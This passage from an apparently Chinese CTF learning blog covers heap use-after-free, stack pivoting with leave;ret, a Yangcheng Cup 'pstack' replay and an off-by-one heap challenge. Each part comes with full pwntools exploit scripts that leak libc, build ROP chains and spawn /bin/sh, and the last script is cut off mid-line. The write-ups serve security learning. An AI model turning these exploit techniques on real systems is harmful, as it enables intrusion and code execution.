alt="10"></p><p>这个时候我们add（0x10，magic_addr）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001543.png" alt="11"></p><p>因为在printf函数中是先申请note_list中的地址，在fastbin中（tcachebins）中也差不多，有着先进后出的规则，又因为bin中会把大小相似的的chunk再次申请，因此在chunk0的notelist是chunk2的notechunk（可以写入），所以我们调用chunk0中的printf函数就是调用了后门函数</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r=process(&#x27;./pwn&#x27;)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">def add(size,content):</span><br><span class="line">  r.sendlineafter(&#x27;choice :&#x27;,&#x27;1&#x27;)</span><br><span class="line">  r.sendlineafter(&#x27;Note size :&#x27;,str(size))</span><br><span class="line">  r.sendlineafter(&#x27;Content :&#x27;,content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">  r.sendlineafter(&#x27;choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line">  r.sendlineafter(&#x27;Index :&#x27;,str(idx))</span><br><span class="line"></span><br><span class="line">def printf(idx):</span><br><span class="line">  r.sendlineafter(&#x27;choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line">  r.sendlineafter(&#x27;Index :&#x27;,str(idx))</span><br><span class="line"></span><br><span class="line">shell_addr=0x8048945</span><br><span class="line"></span><br><span class="line">add(48,&#x27;aaaa&#x27;)</span><br><span class="line">add(48,&#x27;bbbb&#x27;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">add(8,p32(shell_addr))</span><br><span class="line">printf(0)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移（详解）</title>
      <link href="/posts/17384.html"/>
      <url>/posts/17384.html</url>
      
        <content type="html"><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>栈迁移主要利用了leave_ret这个指令</p></blockquote><table><thead><tr><th align="center">leave</th><th>返回上级函数时，恢复原本的栈空间</th><th>leave</th><th>mov esp,ebp                                                                                                               pop ebp</th></tr></thead><tbody><tr><td align="center">ret</td><td>返回上级函数后，执行上级函数的命令</td><td>ret</td><td>等同于                                              pop eip                                               (不存在这样的指令</td></tr></tbody></table><blockquote><p>ret是把栈顶的元素弹到rip中</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">esp</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>在函数的先执行到leave指令时，会将ebp处填充的地址pop到ebp中去，这样栈基地址发生了变化，在下次的栈位置就会发生变化</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948543.png" alt="read-1"></p><p>有个图对这些指令变化阐述的比较清楚</p><p>来自<a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用 - ZikH26 - 博客园 (cnblogs.com)</a></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948544.png" alt="1"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948545.png" alt="2"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="basectf-week3-stack-in-stack"><a href="#basectf-week3-stack-in-stack" class="headerlink" title="basectf week3  stack_in_stack"></a>basectf week3  stack_in_stack</h3><p>想要赛后要附件的师傅可以加我QQ（2385996427）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948546.png" alt="4"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948547.png" alt="5"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948548.png" alt="6"></p><p>通过这里的动态调式才发现溢出了0x10个字节，故通过栈迁移来进行</p><h4 id="第一个read"><a href="#第一个read" class="headerlink" title="第一个read"></a>第一个read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=(p64(gift)+p64(main)).ljust(0x30,b&#x27;\x00&#x27;) </span><br><span class="line">payload+=p64(leak-0X8)+p64(leave_ret)  </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>统一解释一下这个leave_ret</p><p>下面的步骤大概是这样的</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948549.png" alt="8"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948550.png" alt="2-1"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948551.png" alt="2-2"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948552.png" alt="2-3"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948553.png" alt="2-4"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111948554.png" alt="2-5"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>不知道为啥，我本地要libc版本一直匹配不到，换这个脚本本地才能打通(记得patchelf换本地的环境)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;challenge.basectf.fun&#x27;,32210)</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#$libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main=0x4010e0</span><br><span class="line">gift=0x4011c6</span><br><span class="line">leave_ret=0x4012f2</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;mick0960.\n&#x27;)</span><br><span class="line">leak=int(p.recv(14),16)</span><br><span class="line">print(hex(leak))</span><br><span class="line"></span><br><span class="line">payload=(p64(gift)+p64(main)).ljust(0x30,b&#x27;\x00&#x27;)</span><br><span class="line">payload+=p64(leak-0X8)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;You found the secret!\n&#x27;)</span><br><span class="line">p.recvuntil(b&#x27;0x&#x27;)</span><br><span class="line">puts=int(p.recv(12),16)</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;mick0960.\n&#x27;)</span><br><span class="line">leak2 = int(p.recv(14), 16)</span><br><span class="line">#$libc=LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=puts - elf.symbols[&#x27;puts&#x27; ]+0x380234 //调试找出来的值，libc版本一直不对</span><br><span class="line"></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">system_addr=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">libc_base=puts-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">pop_rdi=libc_base+0x2a3e5</span><br><span class="line">payload1=(p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)).ljust(0x30,b&#x27;a&#x27;)</span><br><span class="line">payload1+=p64(leak2-0x8)+p64(leave_ret)</span><br><span class="line">#p.recvuntil(b&#x27;mick0960.\n&#x27;)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-栈学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯比赛pwn复现</title>
      <link href="/posts/8209.html"/>
      <url>/posts/8209.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/141632972">首先推荐这个博客</a></p><p>本篇学习的思路来自这个大佬</p><p>实力有限，只复现出了pstack这一题</p><h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947256.png" alt="1"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947257.png" alt="2"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这个题目是个很经典的栈迁移的题目，因为栈溢出的空间不够，但是常规的栈迁移一般有方法获得一个地址来进行leave_ret </p><p>这个题目有个很妙的点<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947258.png"></p><p>这里call 完read后面有一个leave_ret(平时没注意过)</p><p>本题的核心就在于对这里进行反复利用</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>由于leave_ret这<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947259.png" alt="4">个指令</p><p>两次这样就可以控制rbp 和rsp</p><p>这里重点讲下调用vuln_read这个函数后面的过程</p><p>这里我们动态调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">bss=elf.bss()+0x500</span><br><span class="line">leave_ret=0x4006db</span><br><span class="line">read=0x4006C4</span><br><span class="line">pop_rdi=0x400773</span><br><span class="line">pop_rbp=0x4005b0</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">ret=0x400506</span><br><span class="line">print(hex(bss))</span><br><span class="line">#第一次栈迁移获得更多的空间</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">payload=b&#x27;a&#x27;*0x30+p64(bss+0x30)+p64(read)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa&#x27;</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二个payload是我cyclic 64生成的垃圾数据，主要看函数执行的地址到哪</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947260.png" alt="5"></p><p>这里可以看到这个还是在0x30后面进行的溢出地址</p><p>下面接着调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">bss=elf.bss()+0x500</span><br><span class="line">leave_ret=0x4006db</span><br><span class="line">read=0x4006C4</span><br><span class="line">pop_rdi=0x400773</span><br><span class="line">pop_rbp=0x4005b0</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">ret=0x400506</span><br><span class="line">print(hex(bss))</span><br><span class="line">#第一次栈迁移获得更多的空间</span><br><span class="line">payload=b&#x27;a&#x27;*0x30+p64(bss+0x30)+p64(read)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendafter(b&#x27;overflow?&#x27;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#第二次的栈迁移，泄露地址</span><br><span class="line">payload=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(pop_rbp)</span><br><span class="line">payload+=p64(bss+0x200+0x30)</span><br><span class="line">payload+=p64(read)</span><br><span class="line">payload+=p64(bss-0x8)</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">leak_addr= u64(p.recvline(6).strip().ljust(8,b&#x27;\00&#x27;))-libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print(hex(leak_addr))</span><br><span class="line"></span><br><span class="line">libc_base=leak_addr</span><br><span class="line"></span><br><span class="line">read=leak_addr+libc.sym[&#x27;write&#x27;]</span><br><span class="line">print(hex(read))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">system_addr=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload=b&#x27;aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggg&#x27;</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()    </span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111947261.png" alt="6"></p><p>可以看到在rbpgggggggg卡住了</p><p>所以</p><p>在这里leave_ret</p><p>exp 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">bss=elf.bss()+0x500</span><br><span class="line">leave_ret=0x4006db</span><br><span class="line">read=0x4006C4</span><br><span class="line">pop_rdi=0x400773</span><br><span class="line">pop_rbp=0x4005b0</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">ret=0x400506</span><br><span class="line">print(hex(bss))</span><br><span class="line">#第一次栈迁移获得更多的空间</span><br><span class="line">payload=b&#x27;a&#x27;*0x30+p64(bss+0x30)+p64(read)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendafter(b&#x27;overflow?&#x27;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#第二次的栈迁移，泄露地址</span><br><span class="line">payload=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(pop_rbp)</span><br><span class="line">payload+=p64(bss+0x200+0x30)</span><br><span class="line">payload+=p64(read)</span><br><span class="line">payload+=p64(bss-0x8)</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">leak_addr= u64(p.recvline(6).strip().ljust(8,b&#x27;\00&#x27;))-libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print(hex(leak_addr))</span><br><span class="line"></span><br><span class="line">libc_base=leak_addr</span><br><span class="line"></span><br><span class="line">read=leak_addr+libc.sym[&#x27;write&#x27;]</span><br><span class="line">print(hex(read))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">system_addr=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload=(p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)).ljust(0x30,b&#x27;\x00&#x27;)</span><br><span class="line">payload+=p64(bss+0x200-0x8)+p64(leave_ret)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>off-by-one</title>
      <link href="/posts/40587.html"/>
      <url>/posts/40587.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>通过堆块的错位来改变下个堆块的size位置，从可以改写指定的位置的函数</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><p><a href="https://blog.csdn.net/qq_43935969/article/details/116112531">参考</a></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959237.png" alt="1"></p><p>64位 可以改写plt表 </p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959238.png" alt="2"></p><p>点开就是菜单</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959239.png" alt="3"></p><p>这个存在溢出漏洞</p><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="先创造两个chunk"><a href="#先创造两个chunk" class="headerlink" title="先创造两个chunk"></a>先创造两个chunk</h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959240.png" alt="4"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959241.png" alt="5"></p><h3 id="通过改写chunk0（第一个）溢出"><a href="#通过改写chunk0（第一个）溢出" class="headerlink" title="通过改写chunk0（第一个）溢出"></a>通过改写chunk0（第一个）溢出</h3><p>通过溢出多一个字节（0x41）使得下面两个堆块整合到一起</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959242.png" alt="6"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959243.png" alt="7"></p><h3 id="接着free-chunk1-第二个chunk"><a href="#接着free-chunk1-第二个chunk" class="headerlink" title="接着free chunk1(第二个chunk)"></a>接着free chunk1(第二个chunk)</h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959244.png" alt="8"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959245.png" alt="9"></p><h3 id="再重新申请一个大小为0x38的块"><a href="#再重新申请一个大小为0x38的块" class="headerlink" title="再重新申请一个大小为0x38的块"></a>再重新申请一个大小为0x38的块</h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959246.png" alt="10"></p><p>可以看到之前的0x41申请回来了</p><p>这个发的是’a‘</p><h3 id="利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化"><a href="#利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化" class="headerlink" title="利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化"></a>利用上个改写41溢出导致下个堆块记录输入内容的地址发生变化</h3><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959247.png" alt="11"></p><p>这里把那个地址改成了free函数</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>通过题目里面的show函数泄露free处的libc</p><p><strong>就是这个堆块的返回地址已经变成你指定的位置了，无论是输出还是改写就容易了</strong></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111959248.png" alt="12"></p><h3 id="最后找到system-将free函数改成system"><a href="#最后找到system-将free函数改成system" class="headerlink" title="最后找到system 将free函数改成system"></a>最后找到system 将free函数改成system</h3><h3 id="加上前面写入的-bin-sh-x00"><a href="#加上前面写入的-bin-sh-x00" class="headerlink" title="加上前面写入的&#x2F;bin&#x2F;sh\x00"></a>加上前面写入的&#x2F;bin&#x2F;sh\x00</h3><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./pwn&quot;)</span><br><span class="line">#p = remote(&quot;node5.buuoj.cn&quot;,29347)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">gdb.attach(p)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">atoi_got = elf.got[&#x27;atoi&#x27;]</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">cmd(1)</span><br><span class="line">p.recvuntil(&quot;only) :&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;Content:&quot;)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">cmd(2)</span><br><span class="line">p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&quot;Content:&quot;)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">cmd(3)</span><br><span class="line">p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">cmd(4)</span><br><span class="line">p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(0x18,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">create(0x18,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">payload 